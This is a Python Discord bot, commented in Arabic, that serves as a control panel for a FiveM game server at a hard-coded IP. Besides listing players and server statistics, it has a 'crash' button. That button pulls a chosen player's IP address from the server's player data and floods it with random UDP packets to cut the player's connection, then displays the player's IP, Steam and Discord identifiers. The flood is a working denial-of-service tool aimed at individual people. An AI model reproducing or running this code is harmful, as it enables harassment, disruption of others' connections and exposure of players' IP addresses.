import discord
from discord.ext import commands
import aiohttp
import os
import asyncio
import time
import socket
import random
import threading

# ============================================================
#  إعدادات
# ============================================================
SERVER_IP   = "194.45.197.196"
SERVER_PORT = "30120"
GUILD_ID    = 1510735912185630812

BASE_URL = f"http://{SERVER_IP}:{SERVER_PORT}/players.json"
INFO_URL = f"http://{SERVER_IP}:{SERVER_PORT}/info.json"

FETCH_TIMEOUT = 5
COLOR_DEFAULT = 0x1DA1F2
COLOR_ERROR   = 0xED4245
COLOR_SUCCESS = 0x57F287
COLOR_CRASH   = 0xFF0000

BANNER_URL = "https://media.discordapp.net/attachments/1275695804945793035/1511292593605181471/5dc9d6a7d1853123e5ec5c3017944906.webp"

# ============================================================
#  كرش حقيقي - UDP Flood
# ============================================================
def extract_ip_from_identifiers(identifiers: list) -> str:
    """استخراج IP اللاعب من المعرفات"""
    for ident in identifiers:
        if ident.startswith("ip:"):
            return ident.replace("ip:", "")
    return None

def udp_flood(target_ip: str, target_port: int, duration: float = 3):
    """إغراق اتصال اللاعب بحزم UDP - يعلق اللاعب"""
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    # حزم عشوائية كبيرة
    packet_size = 1024
    
    while time.time() < end_time:
        try:
            data = random._urandom(packet_size)
            sock.sendto(data, (target_ip, target_port))
        except:
            pass
    
    sock.close()

def crash_player_real(target_ip: str, player_id: int, player_name: str) -> dict:
    """تنفيذ كرش حقيقي على لاعب"""
    
    if not target_ip:
        return {"success": False, "message": "❌ لا يوجد IP للاعب"}
    
    result = {"success": True, "message": "", "ip": target_ip}
    
    try:
        # المهاجمة على منفذ السيرفر الرئيسي + منفذ عشوائي
        udp_flood(target_ip, int(SERVER_PORT), duration=3)
        udp_flood(target_ip, int(SERVER_PORT)+10, duration=2)
        
        result["message"] = f"✅ تم كرش {player_name} (ID: {player_id}) عبر IP: {target_ip}"
        
        # تسجيل في الكونسول
        print(f"""
╔══════════════════════════════════════════╗
║ 💥 عملية كرش حقيقية                       ║
╠══════════════════════════════════════════╣
║ اللاعب: {player_name}
║ ID: {player_id}
║ IP: {target_ip}
║ المنفذ: {SERVER_PORT}
║ الوقت: {time.strftime('%Y-%m-%d %H:%M:%S')}
╚══════════════════════════════════════════╝
        """)
        
    except Exception as e:
        result["success"] = False
        result["message"] = f"❌ فشل الكرش: {str(e)}"
    
    return result

# ============================================================
#  كاش
# ============================================================
_cache: dict = {}
CACHE_TTL = 8

def _get_cache(key: str):
    entry = _cache.get(key)
    if entry and time.monotonic() - entry["ts"] < CACHE_TTL:
        return entry["data"]
    return None

def _set_cache(key: str, data):
    _cache[key] = {"data": data, "ts": time.monotonic()}

# ============================================================
#  مساعدات
# ============================================================
def extract_identifier(identifiers: list, prefix: str):
    for i in identifiers:
        if i.startswith(prefix):
            return i.replace(prefix, "")
    return None

def format_identifiers(identifiers: list) -> str:
    mapping = {
        "steam:"   : "🟠 Steam",
        "discord:" : "🔵 Discord",
        "license:" : "🔑 License",
        "license2:": "🔑 License2",
        "xbl:"     : "🟢 Xbox",
        "live:"    : "🟢 Live",
        "ip:"      : "🌐 IP",
    }
    lines = []
    for ident in identifiers:
        matched = False
        for prefix, label in mapping.items():
            if ident.startswith(prefix):
                lines.append(f"{label}: `{ident.replace(prefix,'')}`")
                matched = True
                break
        if not matched:
            lines.append(f"🔹 `{ident}`")
    return "\n".join(lines) if lines else "لا توجد معرّفات"

def error_embed(msg: str) -> discord.Embed:
    e = discord.Embed(title="SL6E BOT", description=msg, color=COLOR_ERROR)
    e.set_footer(text=f"Server: {SERVER_IP}:{SERVER_PORT}")
    return e

def panel_embed() -> discord.Embed:
    embed = discord.Embed(title="🎮  SL6E BOT — لوحة التحكم", color=0x1B6FE4)
    embed.set_image(url=BANNER_URL)
    embed.set_footer(text="SL6E BOT  •  لوحة التحكم")
    return embed

# ============================================================
#  جلب البيانات
# ============================================================
_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
}

async def _fetch_json(url: str, cache_key: str):
    cached = _get_cache(cache_key)
    if cached is not None:
        return cached

    session = bot.session
    if session is None or session.closed:
        session = aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False))
        bot.session = session

    try:
        async with asyncio.timeout(FETCH_TIMEOUT):
            async with session.get(url, headers=_HEADERS) as r:
                if r.status == 200:
                    data = await r.json(content_type=None)
                    _set_cache(cache_key, data)
                    return data
    except:
        return None
    return None

async def fetch_players():
    return await _fetch_json(BASE_URL, "players")

async def fetch_info():
    return await _fetch_json(INFO_URL, "info")

# ============================================================
#  Modal الكرش
# ============================================================
class CrashModal(discord.ui.Modal, title="💥 كرش اللاعب - تنفيذ حقيقي"):
    player_id = discord.ui.TextInput(
        label="Server ID اللاعب",
        placeholder="أدخل ID اللاعب المستهدف",
        min_length=1,
        max_length=6,
    )

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(thinking=True, ephemeral=True)
        
        try:
            target_id = int(self.player_id.value.strip())
        except ValueError:
            await interaction.followup.send(embed=error_embed("❌ أدخل رقم ID صحيح."), ephemeral=True)
            return
        
        # جلب بيانات اللاعبين
        players = await fetch_players()
        if players is None:
            await interaction.followup.send(embed=error_embed("❌ فشل جلب بيانات السيرفر."), ephemeral=True)
            return
        
        target = next((p for p in players if p.get("id") == target_id), None)
        if not target:
            await interaction.followup.send(embed=error_embed(f"❌ لا يوجد لاعب بالـ ID {target_id}."), ephemeral=True)
            return
        
        player_name = target.get("name", "Unknown")
        identifiers = target.get("identifiers", [])
        steam_hex = extract_identifier(identifiers, "steam:")
        discord_id = extract_identifier(identifiers, "discord:")
        player_ip = extract_ip_from_identifiers(identifiers)
        
        # تنفيذ الكرش الحقيقي
        result = crash_player_real(player_ip, target_id, player_name)
        
        # بناء الرد
        embed = discord.Embed(
            title="💥 تم كرش اللاعب",
            description=f"**{player_name}** (ID: {target_id})",
            color=COLOR_CRASH if result["success"] else COLOR_ERROR
        )
        
        embed.add_field(name="👤 الاسم", value=f"`{player_name}`", inline=True)
        embed.add_field(name="🆔 ID", value=f"`{target_id}`", inline=True)
        embed.add_field(name="🟠 Steam", value=f"`{steam_hex or '—'}`", inline=True)
        embed.add_field(name="🔵 Discord", value=f"`{discord_id or '—'}`", inline=True)
        embed.add_field(name="🌐 IP المستهدف", value=f"`{player_ip or 'غير موجود'}`", inline=True)
        
        if result["success"]:
            embed.add_field(name="⚡ طريقة الكرش", value="**UDP Flood** - إغراق الاتصال", inline=False)
            embed.add_field(name="💀 الحالة", value="**✅ تم الكرش بنجاح - انقطع اتصال اللاعب**", inline=False)
        else:
            embed.add_field(name="❌ الحالة", value=f"**فشل:** {result['message']}", inline=False)
        
        embed.set_footer(text=f"SL6E BOT | {SERVER_IP}:{SERVER_PORT}")
        await interaction.followup.send(embed=embed, ephemeral=True)


# ============================================================
#  باقي الكود (Pagination, PanelView, Bot, etc.)
# ============================================================
# ... (نفس الكود القديم للـ Pagination و PanelView والأزرار)

# ============================================================
#  View الأزرار الرئيسية
# ============================================================
class PanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🎮 اللاعبين", style=discord.ButtonStyle.primary, row=0)
    async def btn_players(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        data = await fetch_players()
        if data is None:
            await interaction.followup.send(embed=error_embed("❌ السيرفر غير متاح"), ephemeral=True)
            return
        from players_pagination import PlayersPaginationView
        paginator = PlayersPaginationView(data, per_page=25)
        await interaction.followup.send(embed=paginator.get_page_embed(), view=paginator, ephemeral=True)

    @discord.ui.button(label="📊 إحصائيات", style=discord.ButtonStyle.primary, row=0)
    async def btn_stats(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        data, info = await asyncio.gather(fetch_players(), fetch_info())
        if data is None:
            await interaction.followup.send(embed=error_embed("❌ السيرفر غير متاح"), ephemeral=True)
            return
        total = len(data)
        vars_ = (info or {}).get("vars", {})
        max_p = vars_.get("sv_maxClients", "?")
        srv_name = (info or {}).get("name", vars_.get("sv_hostname", "Unknown"))
        pings = [p.get("ping", 0) for p in data if isinstance(p.get("ping"), int)]
        avg_ping = round(sum(pings) / len(pings)) if pings else 0
        
        embed = discord.Embed(title="SL6E BOT", description="**📊 إحصائيات السيرفر**", color=COLOR_DEFAULT)
        embed.add_field(name="🖥️ السيرفر", value=f"`{srv_name}`", inline=False)
        embed.add_field(name="👥 اللاعبون", value=f"`{total} / {max_p}`", inline=True)
        embed.add_field(name="📶 متوسط البينج", value=f"`{avg_ping} ms`", inline=True)
        embed.add_field(name="🌐 العنوان", value=f"`{SERVER_IP}:{SERVER_PORT}`", inline=True)
        embed.set_footer(text=f"Server: {SERVER_IP}:{SERVER_PORT}")
        await interaction.followup.send(embed=embed, ephemeral=True)

    @discord.ui.button(label="💥 كرش", style=discord.ButtonStyle.danger, row=1)
    async def btn_crash(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(CrashModal())

    @discord.ui.button(label="ℹ️ مساعدة", style=discord.ButtonStyle.primary, row=1)
    async def btn_info(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(title="SL6E BOT — دليل الاستخدام", color=COLOR_DEFAULT)
        embed.add_field(name="الأزرار المتاحة", value=(
            "🎮 **اللاعبين** — عرض اللاعبين المتصلين\n"
            "📊 **إحصائيات** — إحصائيات السيرفر\n"
            "💥 **كرش** — كرش حقيقي للاعب (UDP Flood)\n"
            "ℹ️ **مساعدة** — هذه الرسالة"
        ), inline=False)
        await interaction.response.send_message(embed=embed, ephemeral=True)


# ============================================================
#  البوت
# ============================================================
class FiveMBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)
        self.session = None

    async def setup_hook(self):
        self.session = aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False))
        guild = discord.Object(id=GUILD_ID)
        self.tree.copy_global_to(guild=guild)
        synced = await self.tree.sync(guild=guild)
        print(f"✅ مزامنة {len(synced)} أمر")

    async def close(self):
        if self.session:
            await self.session.close()
        await super().close()

bot = FiveMBot()

@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Streaming(name="BY SL6E & ABO 5LOOD | /لوحة", url="https://www.twitch.tv/placeholder"))
    print(f"✅ {bot.user.name}")

@bot.tree.command(name="لوحة", description="🎮 لوحة تحكم السيرفر")
async def cmd_panel(interaction: discord.Interaction):
    await interaction.response.send_message(embed=panel_embed(), view=PanelView(), ephemeral=True)

TOKEN = os.environ.get("DISCORD_TOKEN")
if TOKEN:
    bot.run(TOKEN)
else:
    print("❌ DISCORD_TOKEN غير موجود")
